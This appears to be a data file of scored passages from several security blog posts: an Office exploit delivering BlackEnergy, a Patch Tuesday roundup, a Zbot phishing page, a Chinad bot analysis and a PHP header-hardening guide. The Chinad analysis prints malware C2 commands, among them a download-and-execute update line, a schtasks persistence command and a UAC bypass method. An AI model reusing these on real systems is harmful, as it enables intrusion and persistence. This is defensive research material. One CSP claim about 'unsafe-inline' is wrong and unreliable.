"What was more important, however, was what was happening in the background. The PowerPoint package contained two embedded OLE objects, each with a remote path where the resource is located. The two files were named slide1.gif and slides.inf.",0.008592264689833762
"It is a feature of Microsoft PowerPoint to load these files, but it turned out to be a dangerous one, since the objects could be downloaded from an arbitrary untrustworthy network location and executed with none of the warning pop-ups, addressed in the MS12-005 patch.",0.01021950443245978
"So what were the two downloaded files? The .gif file was not an image but, in fact, a camouflaged BlackEnergy Lite dropper. .INF files are executable and typically used to install device drivers.",0.015442967386786188
"In this particular instance, the .INF file’s job was to rename the BlackEnergy dropper from slide1.gif to slide1.gif.exe and execute it using a simple Windows Registry entry:",0.008655714932136682
"Functionally similar exploits have been known since at least 2012 but have not been widely abused. After seeing this one actively used by malware in-the-wild, ESET has reported it to Microsoft on September 2nd, 2014.",0.012111864733929667
"Now that the vulnerability has been recognized as CVE-2014-4114 and Microsoft created a patch for it, we strongly encourage all users to close this infection vector by updating as soon as possible.
",0.00911438055716085
November Patch Tuesday fixes close 112 holes—including one already being exploited,0.011027396061000228
"An ""in the wild"" kernel exploit, browser bugs, and 15 Azure Sphere vulnerabilities are among the 112 security fixes issued by Microsoft in the November 2020 update.",0.015182345527383512
"Written by
Sean Gallagher,",0.008884235691614673
SophosLabs Offensive Security,0.008990065059669039
"November 10, 2020",0.00943973864776404
SophosLabs Uncut CVE-2020-16982 CVE-2020-16988 CVE-2020-16998 CVE-2020-17010 CVE-2020-17038 CVE-2020-17053 CVE-2020-17057 CVE-2020-17061 CVE-2020-17087 Microsoft Windows Patch Tuesday,0.014308617716910055
"The eleventh Patch Tuesday of 2020 has arrived, with 112 new updates—of which 18 have been classified as critical by Microsoft, with another 92 marked as important. And one of the critical fixes is for a vulnerability that has already reportedly been used by an “in the wild” exploit.
CVE-2020-17087, a Windows kernel local elevation of privilege vulnerability, was first publicly reported by Google’s Project Zero in October after the discovery of active exploits. The vulnerability is in the Windows kernel’s cryptography driver (cng.sys).
A bug in one of the functions of the driver (CfgAdtpFormatProperty) causes it to be vulnerable to a buffer overflow attack that causes memory corruption in the kernel pool, or heap. It could be used for sandbox escape or other privilege escalation purposes by malicious code. Project Zero went public with the bug report and a proof of concept for exploitation on October 30, just seven days after it was discovered, because of evidence it was already being used in targeted attacks.
However, the kernel memory corruption bug is only ranked as “important” by Microsoft, despite its active exploitation. Some of the other bugs are a more clear and present danger to particular sets of Windows users.
Browser bugs
Two of the vulnerabilities of more widespread concern are tied to Microsoft’s Internet Explorer and Edge browsers. While Internet Explorer may be declining in use, some of its components are still used by Windows—and are still vulnerable to attack.
The critical vulnerabilities in question are both related to memory corruption—CVE-2020-17053 (in a component of Internet Explorer) and CVE-2020-17048 (in the Chakra Scripting Engine, part of the Edge browser). The Internet Explorer component bug is an arbitrary pointer de-reference vulnerability, while the Chakra Scripting engine bug is a “use after free” memory vulnerability in the JScript9 component. Both of these vulnerabilities are likely to be exploited, and could be used to remotely execute arbitrary code.
Azure Sphere
The single largest source of bugs this month was Azure Sphere, which had 15 vulnerabilities disclosed—two of them critical. These include six separate unsigned code execution vulnerabilities, which allow remote code execution (one, CVE-2020-16982, was rated as critical), and five elevation of privilege vulnerabilities (with CVE-2020-16988 rated as critical).
The remaining vulnerabilities in Azure Sphere are rated as “important”:",0.01137017154612363
"CVE
Name",0.008607110338791912
"CVE-2020-16986
Azure Sphere Denial of Service Vulnerability",0.009692939099744002
"CVE-2020-16981
Azure Sphere Elevation of Privilege Vulnerability",0.011047502618010463
"CVE-2020-16989
Azure Sphere Elevation of Privilege Vulnerability",0.011090101060779567
"CVE-2020-16992
Azure Sphere Elevation of Privilege Vulnerability",0.010761740051325797
"CVE-2020-16993
Azure Sphere Elevation of Privilege Vulnerability",0.01070651195715111
"CVE-2020-16985
Azure Sphere Information Disclosure Vulnerability",0.010410448516232407
"CVE-2020-16990
Azure Sphere Information Disclosure Vulnerability",0.010601115850708664
"CVE-2020-16983
Azure Sphere Tampering Vulnerability",0.010851387686278358
"CVE-2020-16970
Azure Sphere Unsigned Code Execution Vulnerability",0.011066881081383206
"CVE-2020-16984
Azure Sphere Unsigned Code Execution Vulnerability",0.011270612659934787
"CVE-2020-16987
Azure Sphere Unsigned Code Execution Vulnerability",0.011163764948236898
"CVE-2020-16991
Azure Sphere Unsigned Code Execution Vulnerability",0.011324473117910627
"CVE-2020-16994
Azure Sphere Unsigned Code Execution Vulnerability",0.011541296529193668
"Another Azure-related vulnerability, CVE-2020-1325, is a spoofing vulnerability in Azure DevOps Server and Team Foundation Services. No details on this bug were provided.
Network File System
Not too many people use Network File System (NFS) outside of organizations that need compatibility across Windows, Linux and Unix for file sharing. The most concerning of these are CVE-2020-17051 and CVE-2020-17056,  two major vulnerabilities affecting the NFS Service for Windows Server. When combined, they could lead to a very reliable route to exploitation against the latest versions of Windows Server, including 2016 and 2019.
CVE-2020-17051 is a heap overflow in the NFS driver (nfssvr.sys), affecting all versions of Windows Server. Although this critical vulnerability is triggerable remotely and likely to be exploitable, it requires write access to a directory in order to create a symlink. By forging a specific NFS message, the attacker fully controls the size of the buffer that will be used when copying data to a heap chunk with fixed size (for example, as with the code “memcpy($kernel_address, $controlled_content, $controlled_size)”). While this requires prior heap shaping (or “heap feng-shui“), it could allow an attacker to overwrite a following heap chunk. Overwriting function pointers would lead to code execution.
CVE-2020-17056 is a out-of-bound read in the same driver (nfssvr.sys). Even though such vulnerability can also cause a “blue screen of death” on the remote target, its most valuable use would be to leverage it into leaking kernel data by attacker, and therefore defeating kernel address space layout randomization (kASLR). It is therefore a perfect target to combine with CVE-2020-17051 to achieve stable code execution.
Since NFS is not installed by default, most Windows Server users will not be affected by these bugs. For those who are, the best short-term mitigation is to disable NFS—but patching is essential for those who need NFS for file services.
Other “criticals”
The remaining most serious bugs patched are all remote code excution vulnerabilities. Among them are bugs in Microsoft Windows’ Print Spooler, Scripting Engine, and a number of video and image file extensions:",0.010167013666320668
"CVE
CVE Title",0.009151070276203987
"CVE-2020-17105
AV1 Video Extension Remote Code Execution Vulnerability",0.010721362008742963
"CVE-2020-17101
HEIF Image Extensions Remote Code Execution Vulnerability",0.011177924051275157
"CVE-2020-17106
HEVC Video Extensions Remote Code Execution Vulnerability",0.011992468191848515
"CVE-2020-17107
HEVC Video Extensions Remote Code Execution Vulnerability",0.01230190403310183
"CVE-2020-17108
HEVC Video Extensions Remote Code Execution Vulnerability",0.012084507451353255
"CVE-2020-17109
HEVC Video Extensions Remote Code Execution Vulnerability",0.012033291339235475
"CVE-2020-17110
HEVC Video Extensions Remote Code Execution Vulnerability",0.01177644587260862
"CVE-2020-17058
Microsoft Browser Memory Corruption Vulnerability",0.010762074121308585
"CVE-2020-17078
Microsoft Raw Image Extension Remote Code Execution Vulnerability",0.00973212253502409
"CVE-2020-17079
Microsoft Raw Image Extension Remote Code Execution Vulnerability",0.009763346867121325
"CVE-2020-17082
Microsoft Raw Image Extension Remote Code Execution Vulnerability",0.00990843280112208
"CVE-2020-17052
Scripting Engine Memory Corruption Vulnerability",0.010056424346046144
"CVE-2020-17042
Windows Print Spooler Remote Code Execution Vulnerability",0.010167770931992726
A breakdown of vulnerabilities addressed in the November 2020 Patch Tuesday updates—click to view full-size chart.,0.01599166051051637
"More reasons to patch
Also of note is a vulnerability in Microsoft’s implementation of the Kerberos network authentication protocol (CVE-2020-17049). These bugs are reported as security feature bypass vulnerabilities. No details were provided.
Among the bugs Microsoft provided partners proof of concept exploits was CVE-2020-16998, a DirectX Elevation of Privilege Vulnerability, rated as important. The bug is another “use after free” memory corruption vulnerability, in the DirectX driver dxgmms2.sys. While this bug seems likely to be exploited, it is not considered a risk for remote code execution; its only viable use appears to be for escalation of privileges or sandbox evasion only.
There are also three separate elevation of privilege vulnerabilities in Windows’ 32-bit kernel subsystem (Win32k)— CVE-2020-17010, CVE-2020-17038, and CVE-2020-17057. All three patched bugs are use-after-free vulnerabilities that require only low privileges to be exploited—resulting in system-level access if successful.
Sharepoint has a total of seven vulnerabilities patched this month, including one remote code execution bug. CVE-2020-17061 is a deserialization vulnerability, and one that is likely to be exploited. But it requires user authentication, so attackers would have to have legitimate or stolen credentials to take full advantage of it.
Sophos protection
Here is a list of protection released by SophosLabs in response to this advisory to complement any existing protection and generic exploit mitigation:",0.009592178484042035
"CVE
SAV
IPS",0.009183097362180814
"CVE-2020-17087
Exp/202017087-A",0.010853201516466182
"CVE-2020-17052
Exp/202017052-A
SID:2304462",0.011617191933338544
"CVE-2020-17053
Exp/202017053-A
SID:2304463",0.011428343966997434
CVE-2020-17051,0.009504714279732207
SID:2304505,0.008012745194496573
CVE-2020-17056,0.010178113632109409
SID:2304507,0.008213751695994254
"Sophos aims to add detections for critical issues, based on the type and nature of the vulnerabilities, as soon as possible and where we have been given sufficient information to be able to do so. In many cases, existing detections in endpoint products such as Intercept X will catch and block exploit attempts without the need for updates.",0.0089820509245917
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"The Zbot keylogger campaign-of-the-month targets users of AOL Instant Messenger (AIM) with a message that claims to be an update notification for users of the instant messaging client application. Users unfortunate enough to click through the link in the email message to download what they think is something called “aimupdate_7.1.6.475.exe” will be in for a rude awakening.
The malicious page delivers its payload whether or not a victim clicks the link to get executable file: It opens an iframe to a site that attempts to use vulnerable versions of Adobe Reader to push the Zbot keylogger down to the victim’s computer, then execute it, within a few moments of the page loading.
The address of the iframed page resides in a particularly sketchy corner of the net. The network the IP address is part of, known as AS50369, goes by the name VISHCLUB-as Kanyovskiy Andriy Yuriyovich. Sure sounds a lot like someone’s name for their phishing gang. The same network has been in use for the past week delivering payloads on well-worn Outlook Web Access and HMRC Zbot download pages.
Seriously, though: Vishclub? Is that the best the Russian hackers can come up with? It sounds like what you’d call a fisherman’s smoking lounge on the Baltic coast, where thick clouds of cheap tobacco is the only thing that can overpower the putrid stench of rotting seafood.
The fake page has the outward appearance of a page hosted by AOL, but it clearly isn’t the real deal. Once you take a closer look, the site and its social engineering tricks begin to smell a bit like day-old fishwrap, as well.
To begin with, AOL doesn’t release update “patch” applications for AIM. When they have a new release, you download the whole application’s installer. The current version sizes up at about 7MB; The Trojan is only around 130KB. In addition, the true AIM installer carries a digital signature from AOL LLC, the parent company. This one has no such signature.",0.012123896242872578
"The link to the download uses a URL that begins with “update.aol.com” but is followed by the malicious domain name, which is a six- to seven-random-character word followed by .com.pl (which indicates the domain was registered as a business in Poland, but isn’t necessarily hosted there). There are dozens of URLs in use that lead to identical looking pages, and each one points to at least 15 IP addresses at different Web hosting firms.
Like many of the previous Zbot campaigns (such as those targeting the IRS, CDC, Visa, and other organizations, as well as software programs like Microsoft Outlook, or Web sites such as Facebook), the URL contains the email address to which the original message was sent; That email address appears near the top of the browser window. That’s social engineering trick number one, and you can easily see that it’s possible to manipulate this data simply by putting a different email address in the URL string.",0.01200428755346028
"Regular users of AOL Instant Messenger might know that the current, real version (as I write this) is 7.1.6.4, but the version number in this bogus message is 7.1.6.475.
The fake page contains the following text:
AOL has released an update for AOL Instant Messenger (AIM) which fixes several major bugs. This update is critical and provides you with the latest version of the AIM and offers the highest levels of stability and security.
Quick Details
• File Name: aimupdate_7.1.6.475.exe
• File Size: 131 KB
System Requirements
• Supported Operating Systems: Windows 2000; Windows 98; Windows ME; Windows NT; Windows Server 2003; Windows XP; Windows Vista
aimupdate_7.1.6.475.exe
By clicking the download button below you agree to the terms of the AIM Software End User Agreement, Privacy Policy, and Terms of Service.
Once downloaded, this “aimupdate” file carries a generic program icon, and is only around 125KB to 135KB in size (the size varies because Zbot Trojans are padded with variable amounts of random junk data so they’re harder to identify).
The exploits the page employs are pretty complex. It opens, in an iframe, a page hosted on the IP address in the “Vishclub” network, which in turn loads a fairly large (15628 byte) blob of obfuscated javascript.",0.011755821052371163
"The script invokes the browser to load Adobe Reader, then pushes a file called “pdf.pdf” down to the Reader. That file is built to attack the Collab overflow exploit (CVE-2007-5659), the util.printf overflow exploit (CVE-2008-2992), and the getIcon exploit (CVE-2009-0927) in order to force the operating system to download and execute files.
As we’ve recommended before, unless you have an absolute and explicit need to use it, turn off Adobe Reader’s embedded Javascript. (Click Edit -> Preferences, then select JavaScript in the left pane, and deselect “Enable Acrobat JavaScript”.)",0.00983808730435054
"And, when in doubt about a software update, go to the software maker’s Web site yourself; Don’t follow fishy, phishy update links you receive via email, or elsewhere.
",0.015204920460041071
"Unusual Exploit Kit Targets Chinese Users (Part 2)
Recently, our researchers identified a strange exploit kit targeting Chinese domains. In that writeup, we talked about how the exploit kit operates in great detail, to include infection vectors, the delivered payload executables, and how the kit will stop in its tracks if the Chinese AV Qihoo 360 is detected.
This article will discuss the malware delivered from that exploit kit. The malware, which has been identified by many vendors on VirusTotal, has been labeled by our researchers as Trojan.Chinad or just “Chinad” as an alternative (short) label.
Observed Chinad Malware Files:
notepad.exe (MD5: 5a454c795eccf94bf6213fcc4ee65e6d)
pic.jpg (MD5: 4e8639378d7a302c7474b5e4406dd7b4)
image.png (MD5: 55c447191d9566c7442e25c4caf0d2fe)
5003.tmp (MD5: d6ce4b6db8407ca80193ede96d812bb7) – Real Name, “Module_UacBypass.dll”
Notepad.exe (Chinad)
Summary
Notepad.exe (“Chinad”) behaves much like a typical bot client. This binary, along with image.png, is the main component of the Chinad malware.
The Chinad bot sends network requests to a remote server where it will then receive commands to carry out various tasks on the victim’s computer. Some of this functionality includes injecting arbitrary shellcode into itself, although the primary purpose of the bot appears to be for DoS attacks.
Delivery of this Chinad malware executable has been observed via FTP and after successful exploitation of CVE-2014-6332 in Microsoft Internet Explorer.
Technical Analysis
The executable has been compressed with UPX to reduce its size, making network transfers to potential victims more efficient.",0.013795883837417255
And underneath the UPX compression is a rather clean Microsoft Visual C++ executable.,0.015721957490037464
"Chinad first creates a mutex with the hardcoded name “Global\3672a9586a5f342b2ca070851e425db6” and copies itself into the users’ System folder if Admin privileges are found, and into the Appdata folder if not:
%windir%\System\Init\wininit.exe
(""C:\Windows"" being a typical value for %windir%)
%appdata%\Microsoft\System\wininit.exe
(""C:\Users\\Roaming"" being a typical value for %appdata%)
It remains persistent on the victim’s system using either a traditional “runkey” registry method or by using the Windows task scheduler, the commandline for which can be observed below:
C:\Windows\system32\schtasks.exe /create /F /sc onstart /tn Microsoft\Windows\Shell\Init /tr \C:\Windows\System\Init\wininit.exe\ /ru system
This will also launch Chinad as a system user, the account having the highest level of privileges within Windows.
Before contacting any related malware servers, Chinad will first perform a simple Internet connectivity test, first trying to contact www.baidu.com.",0.016588330105244964
"Chinad will sleep if it has not active Internet connection; otherwise, it will continue to retrieve commands.
Receiving Commands
Receiving commands to execute is done by retrieving a file called “bootstrap.min.css” from a remote server (hardcoded IP address by default). An example of this request can be seen in the image below.",0.01392479106600275
"However, before Chinad can read any commands, it must first decrypt the retrieved file, which has been encrypted with the Salsa20 cipher, identified by the string “expand 32-byte k” and similar decompiled source code.",0.009476412537571699
"Commands accepted by Chinad include:
update - Store current cnc and report server info in a encrypted file. Then, download and execute an updated version of the malware, and delete the old copy.
syntax: <command>,<url>,<param_1>,<param_2>,<param_3>;
cnc - Specify address of cnc server to contact for commands.
syntax: <command>,<url>;
cnc_reset - Reset address of CNC server to the default value.
syntax: <command>;
report - Specify address of reporting server.
syntax: <command>,<url>;
report_reset - Reset address of reporting server to default value.
syntax: <command>;
attack - Attack a target IP over either a TCP or UDP socket using generated data.
syntax: <command>,<udp|tcp>,<target IP>,<start_time>,<stop_time>,<sleep>;
attack_reset - Reset address of the attack target.
syntax: <command>;
url_exec - Download a file from a specified url and execute it using WinExec
syntax: <command>,<url>,<param_1>;
shellcode_exec - Create a suspended process and inject shellcode into it. Then, resume the process.
syntax:<command>,<shellcode>;
The first command typically received by Chinad from the C&C server is the “update” command, which contains a parameter with a download url for the updated malware binary. In this case, it is image.png, a slightly more robust version of the bot.
Commands appear to be separated by a semicolon, the same syntax used in many modern programming languages, such as C. It appears that multiple commands can be issued at a time, as the “attack_reset” command is issued next. An example of a full command is seen below:
timestamp,1431270567;
update,http:///image.png?13572v44,44,1,5b7e022f5009004985b34cf091d06752c765a25b445a46050eef51a17be8267d;
attack_reset;
The timestamp keyword is not actually a command, but has a value that represents a decimal-formatted FILETIME structure that will be compared with the system’s time. It seems this is used to ensure the malware only executes commands during times the botmaster wishes, and allows the botmsater to control when a bot will “expire”.
In the case of the update command, Chinad does something special before updating the malware, in that it first stores its current configuration information in a Salsa20-encrypted file. If the user has Admin privileges, this file will be stored at:
%windir%\Logs\WMI\Event\SystemEvent.evt
If no Admin privileges are available, the file is stored at:
%appdata%\Microsoft\System\wow64.dll
When the updated malware is executed, it will first open this file and decrypt its contents to retrieve the last-known address of both the C&C and reporting server.
Reporting Information
Sending report information is another feature of Chinad, although it is not well understood at this point in time. Chinad will first make a call to GetAdaptersInfo, which retrieves information about the victim’s network adapter, like the name and IP address. Next, it will then execute an algorithm to generate a special value.
At the time of this writing, we could not ascertain the meaning of this value. In addition, the report server always responds to the request with “AAA”.",0.018351099101015955
"One theory is our samples of Chinad have “expired” (invalid timestamp values), and thus the reporting function is not working properly. It may also be that the report server used during analysis was simply not working properly.
Regardless, the values included in the request must have a special meaning that only the report server understands. We will update this section if more information becomes available.
Attacking Targets
As mentioned earlier, Chinad can receive attack commands, where it will be instructed to attack a specified IP address. Attacks can be carried out over either TCP or UDP sockets. The purpose of this appears to be carrying out Distributed Denial of Service attacks, oftentimes abbreviated as DDoS attacks.",0.0103374226723294
"Once the attack thread is created, Chinad will continuously send data to the target, sleeping after it sends data for a time specified by the attacker.
It will not stop attacking a target unless it has been issued another attack command or the attack_reset command. Below is an example of data sent to a target over a UDP socket.",0.012788204920909485
"To generate this data, Chinad retrieves the address of the thread’s tiddata block using the CRT function __getptd. It will then mangle returned data somewhat before sending it to the target.
Pic.jpg
Summary
As mentioned in our previous blog, we have observed this Chinad malware being delivered through both Flash and Java exploits.
Pic.jpg is a Dll and requires a parent module (a loader) of either a web browser or java to run it. Like other parts of the Chinad set, pic.jpg aims to get the main bot component, image.png, installed on to the victim’s computer. This is its sole purpose, and can be achieved in several ways, to include exploiting the victim once again.
Technical Analysis
On the exterior, pic.jpg is rather plain and straightforward. The file has no obfuscation applied and no additional exported functions.",0.013298244140047766
"First, pic.jpg first performs a simple check of the full path for the loader process on disk. For example, if the exploit occurred using Flash in a browser, the loader might be at C:\Program Files (x86)\Internet Explorer\iexplore.exe, which is a standard path to Microsft Internet Explorer. Pic.jpg looks for the following strings in the path of the loader:
\java
\iexplore.exe
\mshtml.dll (checks if loaded in memory)
\chrome.exe
\firefox.exe
\safari.exe
\opera.exe
If pic.jpg does not find at least one of these strings in the loader process, it will terminate, likely assuming it’s being analyzed. This can sometimes bypass automated analysis systems, like sandboxes.
Pic.jpg will then attempt to exploit the TS WebProxy component of Microsoft Windows, a vulnerability documented as CVE-2015-0016. This privilege escalation attack (detailed description from Trend Micro here) allows an attacker to launch an arbitrary process. In this case, pic.jpg executes a powershell command in a hidden window. Parameters to the powershell command are seen below, where a base64 encoded gzip archive is first decompressed; this archive contains a script, located in variable $s that is then executed.",0.011791820086446636
The decompressed script contains shellcode (also base64 encoded) that is place in new memory (VirtualAlloc) and executed as a thread.,0.011688790304313246
"Once the shellcode executes, it retrieves image.png from a remote server, names it desktop.ini.exe, and executes it.
In the event that the TS WebProxy exploit does not work, pic.jpg will also trying downloading image.png from a remote server, either directly using UrlDownloadToFile or through a Visual Basic script that’s dropped in a Temp directory.
Image.png (Protected Chinad)
Summary
Delivery of this Chinad malware executable has been observed via FTP and after successful exploitation of CVE-2014-6332 in Microsoft Internet Explorer.
Image.png is another variant of the Chinad bot and is nearly identical to notepad.exe in terms of functionality. However, it has a few extra functions and has much stronger anti-analysis capabilities.
Technical Analysis
Unlike notepad.exe, attackers have chosen to protect image.png by using the powerful Themida protector, a commercial product from Oreans.",0.01149472268830909
"Themida has a lengthy reputation of being a strong protector for executable files. The protector has an extensive feature set, to include capabilities such as VM and forensic tool detection.
In addition, Themida also offers different (mutable) protection code which changes drastically as different features are enabled, making it even harder to automate the process of unpacking.
Interestingly, it seems that it was an odd decision for the attackers to have obfuscated image.png and not notepad.exe, as notepad.exe is much easier to analyze and is essentially the same bot.
One major difference is noted in image.png, where a special Dll is dropped to disk in the user’s Temp directory before retrieving commands from the C&C server.
This Dll, known by its real name as “Module_UacBypass.dll” (the file name on disk is a temporary file name) will be used to establish persistence and bypass User Account Control (UAC) for non-Windows XP systems. More details on this Dll are noted in the section below.",0.01394727280672059
"Besides this, no other major differences have been observed in image.png. It still retains all of the functionality of its related binary, notepad.exe. As future versions of the bot are developed, it seems likely it will be delivered in a protected form, perhaps still using Themida.
5003.tmp (“Module_UacBypass.dll”)
Summary
Module_UacBypass.dll (“Uac_bypass.dll”) is a module seen used by the protected version of the Chinad bot (image.png). It’s main purpose is maintaining persistence for Non-Admin users who are running Windows Vista and later. Persistence is done using non-traditional methods, which involve hijacking a Windows SQL server Dll to bypass UAC and maintain a footprint on the victim’s computer.
Technical Analysis
Uac_Bypass.dll has two exported functions, Func1 and Func2, along with some interesting string artifacts, to include the real name of the Dll, “Module_UacBypass.dll”.",0.014309629561240267
"It is interesting that the authors chose to prefix the name seen with “Module,” suggesting that more modules might be planned for the Chinad bot, or perhaps already in circulation.
Uac_Bypass.dll is primarily used to establish persistance of the Chinad bot for Non-Admin users (for Admin users, persistence is achieved using the schtasks.exe method seen under the analysis of notepad.exe). The module also bypasses UAC, a security feature added in Windows Vista to help prevent execution of malicious programs. Since UAC is not available on Windows XP, this Dll will not execute on systems running the OS.
First, Uac_bypass.dll will make a copy of itself in the temp directory called NTWDBLIB.dll, and then makes that file into a cabinet archive. NTWDBLIB.dll is the name of a library used for Microsoft SQL server.",0.012500581637605368
"The purpose of this is to use this cabinet along with wusa.exe to update the NTWDBLIB.dll (if it exists) with a copy of Uac_Bypass.dll, thereby hijacking the Dll. Wusa.exe is an abbreviated name for Windows Update Standalone Installer, which allows Windows updates to be applied using a supplied cabinet.",0.012598198890666046
"Uac_Bypass.dll also writes a special registry key to:
HKCU\Software\Microsoft\Windows NT\CurrentVersion\UacCompat
This key value contains the path to the Chinad bot.
Then, Uac_Bypass.dll executes cliconfig.exe, which loads the new, malicious NTWDBLIB.dll into memory and points to the DllMain function.",0.011730805017427848
"Inside of DllMain, Uac_Bypass.dll check to see if the string “\cliconfig.dll” is in the calling process name. If it is, it will retrieve the path of the Chinad bot in the registry key above and run it with CreateProcess.
This bypass method has been talked about before here, and has been seen in malware as early as 2013.
Conclusion
The Chinad bot appears to have been designed mainly for the purpose of carrying out DDoS attacks using mostly Chinese victim computers.
Thus far, infected webpages that deliver Chinad have only been spotted on Chinese domains (hence the bot name), while the Exploit kit itself that delivers the malware has been spotted on servers in both Malaysia and Singapore.
Our research teams have not yet seen Chinad outside of Asia, and other clues, such as testing internet connectivity using both baidu.com and qq.com, suggest the bot has a primary focus in the Asian world.
While it doesn’t offer anything revolutionary, we believe the Chinad bot is still in it’s infancy, as some mistakes appear to have been made by the developers. This includes not applying a packer or protector to notepad.exe, a variant of the Chinad bot, as well as leaving many relevant strings, such as the name of “Module_UacBypass.dll” in plain sight.
These things lead us to believe that Chinad was not the work of a seasoned professional, and not likely the work of a group with large resources, such as a nation-state. It will be interesting to see if Chinad offers more improvements with time, along with added functionality.
Contributing analysts:
@joshcannell
@hasherezade
",0.010116609724243442
Why malware authors keep using the same old Microsoft Office exploits,0.010259869077189232
"Written by
John Zorabedian",0.00826774006182307
"May 05, 2016",0.008579860524010274
Products & Services Security Tips Threat Research Exploit kits Gabor Szappanos Technical papers,0.010228364896211262
"SophosLabs Principal Malware Researcher Gabor Szappanos has closely studied Microsoft Office exploits for the past few years. We’ve previously covered his investigation of the Microsoft Word Intruder exploit creation kit, and his recent paper exploring the most popular Office exploit kits.
In a new research report, Gabor takes a closer look at the top four Office exploit kits used in the last quarter of 2015. He also reports which exploits were most commonly used in malicious documents, and shows us what families of malware were distributed by the studied samples.
As Gabor explains, malware authors are increasingly attracted to document exploits as the initial entry point for their attacks. The attackers spread their booby-trapped Office documents through phishing emails spammed out to large numbers of random recipients (cybercrime groups), or to a more select list of targets (APT groups).
Notably, the majority of Office exploits malware authors have been using in malicious documents are now several years old. The most popular exploit, CVE-2012-0158, has been around for well over three years now.",0.015291141993590385
"In recent years, some newer exploits have challenged the leader. CVE-2013-3906 and CVE-2014-0761 were also commonly used, and August 2015 saw a new Office exploit (CVE-2015-1641) start to appear more prominently. But none of these exploits has overtaken CVE-2012-0158, which still represented 48% of exploits used in the final quarter of 2015.
The chart below breaks down the document exploits used in reported incidents from the fourth quarter of 2015.",0.01267339245079413
"Why are older exploits still being used by malware authors?
As Gabor explains, these exploits continue to work against a large percentage of the user population, despite Microsoft having patched these security holes years ago.
Newer exploits may have more value to the cybercrooks, because even fewer users are expected to be patched against newer exploits, Gabor says. But it seems that the older exploits used by the most popular Office exploit kits can still get the job done.
Check out Gabor’s research paper for more of his insights into the most prominent Office exploits and the ways malware authors are using commercial exploit kits to carry out their attacks.
Staying safe from malicious Office documents",0.01314881882607477
"Patch promptly. The booby-trapped Office documents generated by exploit kits attack security holes that were patched years ago.
Keep your security software up to date. A good antivirus can block document attacks like this at several points, starting with the original inbound email.
Beware of unsolicited attachments. This can be hard when your job requires you to work through email, but avoid opening just any old document.
Consider using a stripped-down document viewer. Microsoft’s own Word Viewer, for example, is usually much less vulnerable than Word itself. It doesn’t support macros, either, which protects against Locky-type attacks.",0.013635337484722343
Image of Microsoft Office apps courtesy of dennizn / Shutterstock.com.,0.01306359055019457
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"2
",0.012344956490214498
"How to harden AdwCleaner’s web backend using PHP
More and more applications are moving from desktop to the web, where they are particularly exposed to security risks. They are often tied to a database backend, and thus need to be properly secured, even though most of the time they are designed to restrict access to authenticated users only. PHP is used to develop a lot of these web applications, including several dedicated to AdwCleaner management.
There is no magic unique solution to harden a web application, but as always in security, it’s a matter of layers including:",0.01471880707346096
"Applying the latest security patch and updates
Sending the correct HTTP headers
Hardening the language stack
Hardening the OS
Taking network security measures",0.008290956553967166
"Since we’re in 2017, we’ll consider that security patches and updates are applied properly so this article will focus on several must-have HTTP headers, as well as how we harden our web stack at a PHP level in an effective and easy way for the AdwCleaner web management application.
Securing a web application using HTTP headers
There are a lot of standard HTTP headers for various uses (like encoding and caching) and a lot of them aim to enforce smart security behaviors, like mitigating XSS, for HTTP clients (i.e web browsers). Here are a few useful ones.
A website suffering of XSS, without the proper HTTP headers in place to mitigate it.
Strict-Transport-Security
This instructs the browser to connect to the website using HTTPS directly for a certain period of time using the max-age directive. It can also be applied to subdomains with includeSubDomains directive.",0.01519622712480162
OWASP cheat sheet about XSS,0.006657348350264658
"Referrer-Policy
This header aims to have a fine-grained control over when the referrer is transmitted. Several directives are available, from no-referrer to completely disable the referrer header to strict-origin-when-cross-origin, which means that the full URL is sent with any request made in TLS in the same domain. (Whereas only the domain is sent as referrer if the request is made on a different domain or subdomain.) Finally, if the request is made in HTTP, the referrer is not sent.
It’s a handy header especially to reduce internal URL leaks to external services.",0.010668708214601752
Mozilla Documentation,0.009112298707630417
"X-Content-Type-Option
It enforces the MIME type of resources, and states that they shouldn’t be changed. If the MIME type is not the one advertised with the Content-Type header, then the request is dropped in order to mitigate MIME confusion attacks. There’s only one directive: nosniff.
Mozilla Documentation
X-Frame-Options
This header controls whether or not the page can be loaded as an iframe or an object. There are different directives, from DENY to forbid this behaviour, to SAMEORIGIN, which allows it only from the same origin (domain or subdomain), and ALLOW-FROM which allows the operator to specify a whitelist of origins.
RFC 7034
X-Robots-Tag
This controls how the page should be handled by crawling bots (i.e search engines). Several directives exist: the noindex, nofollow, nosnippet, noarchive directives will avoid the page to be indexed in search results and instruct the crawler to not follow the links of the page. The crawler will also not store any copy of the page.
Google documentation
X-XSS-Protection
This legacy header instructs the browser to block any detected XSS request when set to 1; mode=block. It’s now superseded by the Content-Security-Policy header, but is still useful on older web browsers. This header would have mitigated the XSS on the website at the beginning of this article.
Content-Security-Policy
This powerful header allows the operator to define rules specifying how the webpage resources can be loaded and where from. It’s particularly efficient against XSS. For instance, it’s possible to enforce loading resources on HTTPS only using default-src: https:, or to forbid any inline scripts with the directive default-src: ‘unsafe-inline’.
It’s possible to create more complex rules, for instance:
base-uri ‘none’;  Forbid the usage <base> URI.
default-src ‘self’; Will use the origin as fallback for any fetch directive which is not specified.
frame-src; forbid any external content to be loaded using iframes.
connect-src ‘self’; Forbid ping, Fetch, XMLHttpRequest, WebSocket, and EvenSource to load external content.
form-action ‘self’; Enforce the forms submissions to the origin.
frame-ancestors ‘none’; As X-Frame-Options: Deny, it forbids loading the page using iframes, objects, embed, or applets.
img-src ‘self’ data:; Allow <img> tags to use data uris from the origin only.
media-src ‘none’;  Forbid loading any <audio> or <video> elements.
object-src ‘none’; Forbid loading any <object>, <embed>, and <applet> elements.
script-src ‘self’ ‘unsafe-inline’; Javascript can be loaded inline from the origin only.
style-src ‘self’ ‘unsafe-inline’; Stylesheets can be loaded inline from the origin only.
report-uri /csp-report; Instruct the client to POST any violation of the policy to the specified address, here https://domain.com/csp-report. This directive is being replaced by report-to which has the same syntax.
Here are the W3C specifications about CSP level 2 and CSP3.
While deploying all of these headers may seem difficult, the only read head-scratcher is Content-Security-Policy. Although this one must be deployed, it should be done with care as it may break a lot of applications easily. Use Google Evaluator, a handy tool to analyze any website CSP.
Another valuable service is SecurityHeaders.io, which test your web application headers and give some advice when some are missing or misconfigured.
Here are a few configuration snippets for three webservers to deploy the above configuration. Please note that you may need to adapt this configuration depending on your specific needs (especially the CSP):",0.023856203388937014
